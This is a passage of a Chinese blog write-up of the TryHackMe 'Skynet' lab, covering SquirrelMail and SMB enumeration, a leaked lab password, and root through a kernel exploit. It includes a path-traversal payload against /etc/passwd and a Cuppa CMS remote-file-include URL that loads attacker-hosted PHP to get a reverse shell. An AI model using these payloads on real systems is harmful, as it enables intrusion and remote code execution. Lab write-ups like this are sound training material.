278B  - /server-status                                    </span><br><span class="line">[21:35:04] 403 -  278B  - /server-status/ </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>admin被禁止 访问到一个框架 SquirrelMail version 1.4.23<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240625213714.png" alt="image.png"></p>
+</blockquote>
+<blockquote>
+<p>发现一个远程代码执行漏洞但是目前唯一的问题是 我不知道登陆用户的账号和密码<br>因此无法利用 还是要看看能不能找到<br>之前看到一个信息泄露 milesdyson 猜测可能有他的邮箱</p>
+</blockquote>
+<p>还有个文件包含 h<a target="_blank" rel="noopener" href="http://10.10.12.99/squirrelmail/src/redirect.php?plugins%5B%5D=../../../../etc/passwd%00">http://10.10.12.99/squirrelmail/src/redirect.php?plugins[]=../../../../etc/passwd%00</a><br>试了没啥效果 …..</p>
+<h5 id="回溯smb"><a href="#回溯smb" class="headerlink" title="回溯smb"></a>回溯smb</h5><blockquote>
+<p>回溯smb协议<br>看错了 log目录没看到 里面有log1.txt 泄露了很多可以看到密码<br>直接bp爆破</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240628165637.png" alt="image.png"></p>
+<p>可以看到cyborg007haloterminator  是用户的密码  milesdyson</p>
+<h4 id="0x22-继续信息收集"><a href="#0x22-继续信息收集" class="headerlink" title="0x22 继续信息收集"></a>0x22 继续信息收集</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/images               (Status: 301) [Size: 324] [--&gt; http://10.10.66.17/squirrelmail/images/]</span><br><span class="line">/help                 (Status: 403) [Size: 276]</span><br><span class="line">/themes               (Status: 301) [Size: 324] [--&gt; http://10.10.66.17/squirrelmail/themes/]</span><br><span class="line">/plugins              (Status: 301) [Size: 325] [--&gt; http://10.10.66.17/squirrelmail/plugins/]</span><br><span class="line">/src                  (Status: 301) [Size: 321] [--&gt; http://10.10.66.17/squirrelmail/src/]</span><br><span class="line">/include              (Status: 403) [Size: 276]</span><br><span class="line">/config               (Status: 301) [Size: 324] [--&gt; http://10.10.66.17/squirrelmail/config/]</span><br><span class="line">/class                (Status: 403) [Size: 276]</span><br><span class="line">/functions            (Status: 403) [Size: 276]</span><br><span class="line">/po                   (Status: 403) [Size: 276]</span><br><span class="line">/locale               (Status: 403) [Size: 276]</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这次咱们用 用户进去看看权限 403 页面登陆了还是禁止的<br>但是我们看到了三个邮件</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240628205742.png" alt="image.png"></p>
+<blockquote>
+<p>smb的密码改了跟我们在smb中获取的信息是一样的  强制修改了密码</p>
+</blockquote>
+<p>先看看smb 共享文件  milesdyson</p>
+<figure class="highlight plaintext"><figcaption><span>for [WORKGROUP\milesdyson]:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; dir</span><br><span class="line">  .                                   D        0  Tue Sep 17 09:05:47 2019</span><br><span class="line">  ..                                  D        0  Wed Sep 18 03:51:03 2019</span><br><span class="line">  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 09:05:14 2019</span><br><span class="line">  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 09:05:14 2019</span><br><span class="line">  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 09:05:14 2019</span><br><span class="line">  notes                               D        0  Tue Sep 17 09:18:40 2019</span><br><span class="line">  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 09:05:14 2019</span><br><span class="line">  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 09:05:14 2019</span><br><span class="line"></span><br><span class="line">                9204224 blocks of size 1024. 5653536 blocks available</span><br><span class="line">smb: \&gt; </span><br></pre></td></tr></table></figure>
+<p>全部dump 下来<br>得到很多pdf 和一个笔记<br>很好 import.txt 放着一个代办清单 在这里可以看到</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. Add features to beta CMS /45kra24zxs28v3yd</span><br><span class="line">2. Work on T-800 Model 101 blueprints</span><br><span class="line">3. Spend more time with my wife</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>陪家人 之后要在CMS &#x2F;45kra24zxs28v3yd 中开发功能<br>其他的看不懂 估计是跟这个神经网络有关 因此<br>还是先访问这个页面 感觉也没啥啊<br>太无语了<br>经过提示 ……. 没想到一个重要的一点<br>就是 我们看到他的清单 他第一个任务是想要去做一个cms 的功能点维护<br>这个时候我就应该想到  这就是个cms</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cms cuppa扫描</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x23-cuppacms"><a href="#0x23-cuppacms" class="headerlink" title="0x23 cuppacms"></a>0x23 cuppacms</h3><blockquote>
+<p>这个很快啊 直接就找到了一个nday   远程文件包含<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240628220759.png" alt="image.png"></p>
+</blockquote>
+<p>很舒服  而且看到后端是php<br>直接一句话木马 getshell 试试</p>
+<h3 id="0x30-Get-shell"><a href="#0x30-Get-shell" class="headerlink" title="0x30 Get_shell"></a>0x30 Get_shell</h3><blockquote>
+<p>还记得刚才的是一个 SquirrelMail version 1.4.23<br>找了一个rce但是一直连不上</p>
+</blockquote>
+<p>现在换成  cuppa cms 的 RFI</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alerts/alertConfigField.php?urlConfig=http://10.11.69.232:8000/1.php</span><br></pre></td></tr></table></figure>
+
+<p>**exp</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.70.173/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.69.232/1.php</span><br></pre></td></tr></table></figure>
+
+<p>不知道为啥他好像不支持 bash 而且 nc也反弹不会来 蚁剑传一个php反向连接shell<br>只能这么做了 直接getshell</p>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240703162847.png" alt="image.png"></p>
+<h3 id="0x40Post"><a href="#0x40Post" class="headerlink" title="0x40Post"></a>0x40Post</h3><blockquote>
+<p>依旧是信息收集 先来信息收集</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux version 4.8.0-58-generic (buildd@lgw01-21) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017</span><br></pre></td></tr></table></figure>
+<p>可以看到之前的判断没有错误确实是linux的ubuntu<br>其实运气挺好的  直接就发现一个内核的nday<br>直接就提权了 拿到shell</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/45010">内核nday 漏洞地址</a></p>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240703165323.png" alt="image.png"></p>
+<p>内核版本:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4.4</span>.<span class="number">0</span><span class="number">-31</span>-generic</span><br><span class="line"><span class="number">4.4</span>.<span class="number">0</span><span class="number">-62</span>-generic</span><br><span class="line"><span class="number">4.4</span>.<span class="number">0</span><span class="number">-81</span>-generic</span><br><span class="line"><span class="number">4.4</span>.<span class="number">0</span><span class="number">-116</span>-generic</span><br><span class="line"><span class="number">4.8</span>.<span class="number">0</span><span class="number">-58</span>-generic</span><br><span class="line"><span class="number">4.10</span>.<span class="number">0.42</span>-generic</span><br><span class="line"><span class="number">4.13</span>.<span class="number">0</span><span class="number">-21</span>-generic</span><br></pre></td></tr></table></figure>
+
+<p>看了wp 之后发现另外一种方式</p>
+<table>
+<thead>
+<tr>
+<th>tar 计划任务提权</th>
+<th>[[suid#tar of suid#]]</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+
+                            
+                    </div>
+                    <hr />
+
+                    
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">K1T0</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://k1t0111.github.io/2024/08/17/Thm-Skynet/">https://k1t0111.github.io/2024/08/17/Thm-Skynet/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">K1T0</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+                        <div class="tag_share" style="display: block;">
+                            <div class="post-meta__tag-list" style="display: inline-block;">
+                                
+                                    <div class="article-tag">
+                                        
+                                            <a href="/tags/tryhackme/">
+                                                <span class="chip bg-color">
+                                                    tryhackme
+                                                </span>
+                                            </a>
+                                            
+                                    </div>
+                                    
+                            </div>
+                            <div class="post_share"
+                                style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                                <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                            </div>
+                        </div>
+                        
+                </div>
+    </div>
+
+    
+
+                
+
+                            
+
+                                        
+
+                                                    
+
+                                                                
+
+                                                                            
+
+                                                                                        
+
+                                                                                                    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2024/09/08/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B/">
+                    <div class="card-image">
+                        
+                        <img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240908163821.png" class="responsive-img" alt="横向移动-远程创建进程">
+                        
+                        <span class="card-title">横向移动-远程创建进程</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-09-08
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
+                                    内网渗透
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
+                        <span class="chip bg-color">横向移动</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2024/08/17/Thm-Hackpark/">
+                    <div class="card-image">
+                        
+                        <img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240817104455.png" class="responsive-img" alt="Thm-Hackpark">
+                        
+                        <span class="card-title">Thm-Hackpark</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-08-17
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/" class="post-category">
+                                    渗透靶场
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/tryhackme/">
+                        <span class="chip bg-color">tryhackme</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+        <!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+  
+
+    <!-- 代码语言 -->
+    
+
+        <!-- 代码块复制 -->
+        
+          <script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+          
+
+            <!-- 代码块收缩 -->
+            
+              <script type="text/javascript"
+                src="/libs/codeBlock/codeShrink.js"></script>
+              
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4, h5, h6'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2025</span>
+            
+            <a href="/about" target="_blank">K1T0</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">156.4k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/k1t0111" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:3070123274@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3070123274" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3070123274" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
